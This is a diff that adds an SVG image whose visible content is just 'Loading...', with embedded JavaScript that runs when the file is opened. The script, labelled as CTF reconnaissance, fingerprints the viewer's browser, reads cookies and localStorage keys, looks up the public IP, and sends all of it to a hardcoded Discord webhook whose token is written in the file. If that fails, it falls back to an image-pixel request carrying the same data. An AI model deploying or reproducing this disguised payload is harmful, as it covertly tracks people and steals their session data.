@@ -1,0 +1,269 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
+  <rect width="800" height="600" fill="#0a0a0a"/>
+  <text x="400" y="300" font-size="20" fill="#00ff00" text-anchor="middle">Loading...</text>
+  
+  <script><![CDATA[
+    (async function() {
+      const results = {};
+      
+      // 1. Informações Básicas do Cliente
+      results.client = {
+        ip: 'fetching...',
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        onLine: navigator.onLine
+      };
+      
+      // 2. Informações de Tela e Janela
+      results.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation?.type,
+        windowInnerWidth: window.innerWidth,
+        windowInnerHeight: window.innerHeight
+      };
+      
+      // 3. Timezone e Localização
+      results.location = {
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+        currentTime: new Date().toISOString()
+      };
+      
+      // 4. Canvas Fingerprint (útil para tracking)
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('CTF Recon', 2, 2);
+        results.canvasFingerprint = canvas.toDataURL().slice(-50);
+      } catch(e) {
+        results.canvasFingerprint = 'error';
+      }
+      
+      // 5. WebGL Fingerprint
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        results.webgl = {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+          version: gl.getParameter(gl.VERSION)
+        };
+      } catch(e) {
+        results.webgl = 'not available';
+      }
+      
+      // 6. Plugins e Mimetypes (browsers antigos)
+      results.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+      results.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+      
+      // 7. Features e APIs disponíveis
+      results.features = {
+        localStorage: typeof localStorage !== 'undefined',
+        sessionStorage: typeof sessionStorage !== 'undefined',
+        indexedDB: typeof indexedDB !== 'undefined',
+        webWorker: typeof Worker !== 'undefined',
+        serviceWorker: 'serviceWorker' in navigator,
+        geolocation: 'geolocation' in navigator,
+        notifications: 'Notification' in window,
+        bluetooth: 'bluetooth' in navigator,
+        usb: 'usb' in navigator,
+        webRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)
+      };
+      
+      // 8. Informações de Rede (se disponível)
+      if (navigator.connection) {
+        results.network = {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData
+        };
+      }
+      
+      // 9. Bateria (se disponível)
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          results.battery = {
+            charging: battery.charging,
+            level: battery.level,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+          };
+        } catch(e) {
+          results.battery = 'error';
+        }
+      }
+      
+      // 10. Headers e Referrer
+      results.document = {
+        referrer: document.referrer || 'direct',
+        domain: document.domain,
+        url: window.location.href,
+        origin: window.location.origin,
+        pathname: window.location.pathname,
+        protocol: window.location.protocol
+      };
+      
+      // 11. Cookies atuais
+      results.cookies = document.cookie || 'none';
+      
+      // 12. LocalStorage keys (se permitido)
+      try {
+        results.localStorageKeys = Object.keys(localStorage);
+      } catch(e) {
+        results.localStorageKeys = 'blocked';
+      }
+      
+      // 13. Performance e Timing
+      if (window.performance) {
+        results.performance = {
+          memory: performance.memory ? {
+            usedJSHeapSize: performance.memory.usedJSHeapSize,
+            totalJSHeapSize: performance.memory.totalJSHeapSize
+          } : 'not available',
+          timing: {
+            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
+          }
+        };
+      }
+      
+      // 14. Buscar IP público (última etapa)
+      try {
+        const ipResponse = await fetch('https://api64.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        results.client.ip = ipData.ip;
+      } catch(e) {
+        results.client.ip = 'fetch failed';
+      }
+      
+      // 15. Exfiltração dos dados para Discord Webhook
+      const discordWebhook = 'https://discord.com/api/webhooks/1465419697187979275/XjmVCtt0A0SPV4JH9noltww2DdTO4C_d8Tt5zuxNUY2JbhidigKTVBqpJaoRtlcolrA1';
+      
+      try {
+        // Formatar dados para Discord (limite de 2000 caracteres por mensagem)
+        const summary = `**🎯 CTF Recon Data Captured**
+**IP:** ${results.client.ip}
+**User-Agent:** ${results.client.userAgent.substring(0, 100)}...
+**Platform:** ${results.client.platform}
+**Language:** ${results.client.language}
+**Screen:** ${results.screen.width}x${results.screen.height}
+**Timezone:** ${results.location.timezone}
+**Canvas FP:** ${results.canvasFingerprint}
+**WebGL:** ${typeof results.webgl === 'object' ? results.webgl.vendor : results.webgl}
+**URL:** ${results.document.url}
+**Referrer:** ${results.document.referrer || 'direct'}
+**Cookies:** ${results.cookies.substring(0, 100)}
+**LocalStorage:** ${JSON.stringify(results.localStorageKeys)}`;
+
+        // Payload formatado para Discord
+        const discordPayload = {
+          username: "CTF Recon Bot",
+          avatar_url: "https://i.imgur.com/4M34hi2.png",
+          embeds: [{
+            title: "🚩 Nova Informação Capturada",
+            description: summary,
+            color: 15158332, // Vermelho
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: "CTF Reconnaissance"
+            }
+          }]
+        };
+        
+        // Enviar para Discord
+        await fetch(discordWebhook, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(discordPayload)
+        });
+        
+        // Enviar dados completos em formato JSON (segunda mensagem)
+        const fullDataPayload = {
+          username: "CTF Recon Bot",
+          content: "```json\n" + JSON.stringify(results, null, 2).substring(0, 1900) + "\n```"
+        };
+        
+        await fetch(discordWebhook, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(fullDataPayload)
+        });
+        
+      } catch(e) {
+        console.log('Discord exfiltration failed:', e);
+        
+        // Fallback: tentar enviar via imagem pixel (método alternativo)
+        try {
+          const encoded = btoa(JSON.stringify(results)).substring(0, 500);
+          const img = new Image();
+          img.src = `${discordWebhook}?data=${encoded}`;
+        } catch(e2) {
+          console.log('Fallback também falhou');
+        }
+      }
+      
+      // Exibir dados visualmente no SVG (debug)
+      const svg = document.documentElement;
+      svg.innerHTML = ''; // Limpar
+      
+      const bg = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+      bg.setAttribute('width', '800');
+      bg.setAttribute('height', '600');
+      bg.setAttribute('fill', '#0a0a0a');
+      svg.appendChild(bg);
+      
+      let y = 30;
+      const addText = (text, color = '#00ff00') => {
+        const textEl = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+        textEl.setAttribute('x', '10');
+        textEl.setAttribute('y', y);
+        textEl.setAttribute('font-size', '12');
+        textEl.setAttribute('fill', color);
+        textEl.setAttribute('font-family', 'monospace');
+        textEl.textContent = text;
+        svg.appendChild(textEl);
+        y += 18;
+      };
+      
+      addText('=== CTF RECONNAISSANCE COMPLETE ===', '#ff00ff');
+      addText(`IP: ${results.client.ip}`, '#00ffff');
+      addText(`User-Agent: ${results.client.userAgent.substring(0, 70)}...`, '#00ffff');
+      addText(`Platform: ${results.client.platform} | Language: ${results.client.language}`, '#00ffff');
+      addText(`Screen: ${results.screen.width}x${results.screen.height} | Colors: ${results.screen.colorDepth}bit`, '#00ffff');
+      addText(`Timezone: ${results.location.timezone} (offset: ${results.location.timezoneOffset})`, '#00ffff');
+      addText(`Canvas FP: ${results.canvasFingerprint}`, '#ffff00');
+      addText(`WebGL: ${typeof results.webgl === 'object' ? results.webgl.vendor : results.webgl}`, '#ffff00');
+      addText(`Plugins: ${results.plugins.length} detected`, '#ffff00');
+      addText(`Features: localStorage=${results.features.localStorage}, SW=${results.features.serviceWorker}`, '#ffff00');
+      addText(`Referrer: ${results.document.referrer || 'none'}`, '#ff00ff');
+      addText(`Current URL: ${results.document.url}`, '#ff00ff');
+      addText(`Cookies: ${results.cookies.substring(0, 50)}${results.cookies.length > 50 ? '...' : ''}`, '#ff00ff');
+      addText('', '#00ff00');
+      addText('Data exfiltrated to webhook endpoint!', '#00ff00');
+      addText('Check your collection server for full JSON data.', '#00ff00');
+      
+      // Log no console também
+      console.log('CTF Recon Results:', results);
+      
+    })();
+  ]]></script>
+</svg>
